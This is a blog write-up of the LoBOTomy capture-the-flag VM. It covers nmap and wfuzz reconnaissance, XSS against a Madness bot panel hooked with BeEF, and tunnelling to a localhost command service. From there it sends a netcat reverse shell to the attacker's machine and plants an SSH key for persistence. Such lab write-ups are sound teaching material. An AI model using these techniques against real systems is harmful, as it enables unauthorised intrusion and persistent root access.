@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>LoBOTomy - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-06-16">June 16, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/bot-challenges">bot challenges</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">LoBOTomy</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>The goal of the VM is to obtain a root shell.</p>
+
+<h2 id="nmap:53aa007fdface966a5cc43503783e0d4">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sV -A -p- 192.168.127.128
+ 
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 c0:41:42:1f:08:d9:26:6b:0e:32:dd:eb:a6:b8:94:ef (DSA)
+|   2048 74:4d:1a:68:c8:db:9c:e6:46:d3:13:d8:e0:5e:ca:74 (RSA)
+|_  256 9a:1c:a5:6b:a3:48:3c:8e:16:cd:c9:60:68:ef:d5:55 (ECDSA)
+80/tcp  open  http    Apache httpd 2.4.9 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|_  100000  2,3,4        111/udp  rpcbind
+</code></pre>
+
+<p>I punched the IP into a web browser, and was greeted by the following:</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/lobotomy/web.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>The blog post is a pretty good read - it&rsquo;s Brian&rsquo;s original write up of the bot this challenge is based on.  The text here tells us two things really.  The first is that a copy of the bot&rsquo;s source code is present on this web service somewhere; the second is that there&rsquo;s a simulated client which regularily access the bot panel.</p>
+
+<h2 id="wfuzz:53aa007fdface966a5cc43503783e0d4">WFuzz</h2>
+
+<p>I next set about the task of finding the bot source code.  I suspected that it would be in some compressed format, so I used <code>WFuzz</code> with the various Kali wordlists and prepended with various extensions (.tar.gz, .tar, .bz2, .zip etc)</p>
+
+<pre><code class="language-text">root@kali:/usr/share/wfuzz# wfuzz -c -z file,wordlist/general/common.txt -z file,wordlist/compression_extensions.txt --hc 404 http://192.168.127.128/FUZZ.FUZ2Z
+</code></pre>
+
+<p>I spent ages on this and still wasn&rsquo;t finding any files.  Eventually, it occured to me that the wordlists were all lowercase but WFuzz doesn&rsquo;t have any built-in manging rules.  I sort of took a punt and converted the first letter of each line of some of the wordlists, then ran them again with my file extensions.  I used sed for the conversion.</p>
+
+<pre><code class="language-text">sed  's/^\(.\)/\U\1/' yourfile &gt; convertedfile
+</code></pre>
+
+<p>Eventually I got a hit on <code>Panel.zip</code>.  Downloading and extracting the files give you a proper idea of what to find on the web server itself.</p>
+
+<pre><code class="language-text">root@kali:~/LoBOTomy/Panel# ls -l
+total 24
+drwxr-xr-x 5 root root 4096 Apr  5 02:02 adm
+drwxr-xr-x 2 root root 4096 Apr  5 02:03 inc
+-rw-r--r-- 1 root root 1343 Nov  8  2013 index.php
+-rw-r--r-- 1 root root 1810 Feb  6  2010 logo.gif
+drwxr-xr-x 2 root root 4096 Dec  3  2013 pwd
+drwxr-xr-x 2 root root 4096 Apr  5 02:44 sql (dont upload)
+</code></pre>
+
+<p>I tried navigating to some of these directories, but kept receiving <code>404's</code>.  A little more fuzzing showed that they simply within another directory, <code>'m'</code>.</p>
+
+<p>The main bot page was found at <code>http://192.168.127.128/m/adm/auth.php</code>.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/lobotomy/madness.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>The default username and password is hardcoded in plaintext within <code>inc/config.php</code>.  I found it using <code>grep</code>.</p>
+
+<pre><code class="language-text">root@kali:~/LoBOTomy/Panel# grep -R -i &quot;pass\|password&quot;
+</code></pre>
+
+<p>You can login and take a look around, though there isn&rsquo;t much to see.</p>
+
+<h2 id="xss:53aa007fdface966a5cc43503783e0d4">XSS</h2>
+
+<p>You could probably discover this yourself by reviewing the source code, but I came across this vulnerability whilst I was reading up on Madness.  There is also a SQLi vulnerability, but given the clue regarding an automated client, I stuck with the XSS.</p>
+
+<p>Funnily enough, the two Madness exploits on <code>exploit-db</code> were written by Brian Wallace xD.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/lobotomy/exploit-db.png"  />
+    
+    
+</figure>
+</div>
+
+<p>For proper XSS-pwnage, there&rsquo;s only one way to go: BeEF!</p>
+
+<p>I modified the python exploit to make the XSS point to my beef hook.  Launch the exploit, sit back and wait&hellip;</p>
+
+<p><div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/lobotomy/exploit.png"  />
+    
+    
+</figure>
+</div>
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/lobotomy/hook.jpg"  />
+    
+    
+</figure>
+</div></p>
+
+<p>I took the <code>PHPSESSID</code> of the hooked browser and used it to access Madness again.  This time you can see the bot loaded into the panel.  I tried to make it do &lsquo;stuff&rsquo; but without much success.</p>
+
+<p>Eventually I went back to BeEF and carried out a port scan, through the BeEF HTTP proxy against the loopback address of the box.</p>
+
+<p><div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/lobotomy/portscan.jpg"  />
+    
+    
+</figure>
+</div>
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/lobotomy/ports.jpg"  />
+    
+    
+</figure>
+</div></p>
+
+<p>So we can see ports 22 and 80 (which are kind of expected as they&rsquo;re usually bound to 0.0.0.0), and 3306 which makes sense to bind locally.  However, there is also 8080 which is an alternate to 80 and is unusual to see bound only to the localhost.</p>
+
+<h2 id="curl:53aa007fdface966a5cc43503783e0d4">cURL</h2>
+
+<p>Running netstat on my Kali box, shows that the BeEF proxy is bound to port 6789.</p>
+
+<pre><code class="language-text">root@kali:~# netstat -antp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:6789          0.0.0.0:*               LISTEN      3234/ruby
+tcp        0      0 0.0.0.0:2000            0.0.0.0:*               LISTEN      3234/ruby
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      2566/sshd
+tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      3234/ruby
+</code></pre>
+
+<p>I used an environmental export, to set this as an HTTP proxy and was able to use cURL to communicate directly with the service.</p>
+
+<pre><code class="language-text">root@kali:~# export http_proxy='http://127.0.0.1:6789'
+ 
+root@kali:~# curl -v http://127.0.0.1:8080/
+* About to connect() to proxy 127.0.0.1 port 6789 (#0)
+*   Trying 127.0.0.1...
+* connected
+* Connected to 127.0.0.1 (127.0.0.1) port 6789 (#0)
+&gt; GET http://127.0.0.1:8080/ HTTP/1.1
+&gt; User-Agent: curl/7.26.0
+&gt; Host: 127.0.0.1:8080
+&gt; Accept: */*
+&gt; Proxy-Connection: Keep-Alive
+&gt;
+* additional stuff not fine transfer.c:1037: 0 0
+[...snip...]
+* additional stuff not fine transfer.c:1037: 0 0
+* HTTP 1.1 or later with persistent connection, pipelining supported
+&lt; HTTP/1.1 200
+&lt; Content-Type: text/html; charset=UTF-8
+* no chunk, no close, no size. Assume close to signal end
+&lt;
+ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.
+* nread &lt;= 0, server closed connection, bailing
+* Closing connection #0
+</code></pre>
+
+<p>I wanted to fuzz this port but WFuzz didn&rsquo;t seem to be returning responses properly, so instead I tried <code>dirb</code>.  Dirb simply prints out which requests it receives a response from.  The process was terribly slow, as everything was getting routed through the BeEF proxy.</p>
+
+<p>The first hint of a hit was:</p>
+
+<pre><code class="language-text">+ http://127.0.0.1:8080/arch (CODE:200|SIZE:7)
+</code></pre>
+
+<p>I went to the BeEF Rider history to look up what the actual response was, which turned out to be &lsquo;i686&rsquo;.  Arch is a shell command which prints the machine architecture, so perhaps this service is just some sort of shell bound to 8080.</p>
+
+<p>I used the Rider to send my own test command:</p>
+
+<pre><code class="language-text">GET /whoami HTTP/1.1
+Host: 127.0.0.1:8080
+</code></pre>
+
+<p>To which the response was <code>root</code>.  I did a little more poking and determined that <code>netcat</code> was installed, and was able to leverage that to get a more useful shell.</p>
+
+<pre><code class="language-text">GET /nc%20192.168.127.127%204444%20-e%20%27%2Fbin%2Fsh%27 HTTP/1.1
+Host: 127.0.0.1:8080
+
+root@kali:~# nc -lnvp 4444
+nc: listening on :: 4444 ...
+nc: listening on 0.0.0.0 4444 ...
+ 
+nc: connect to 192.168.127.127 4444 from 192.168.127.128 54444
+ 
+id; whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
+</code></pre>
+
+<p>With a root shell, this is pretty much the end of the challenge.  The final step I took was to add my public SSH key into root&rsquo;s <code>authorized_keys</code> file for easy access.</p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
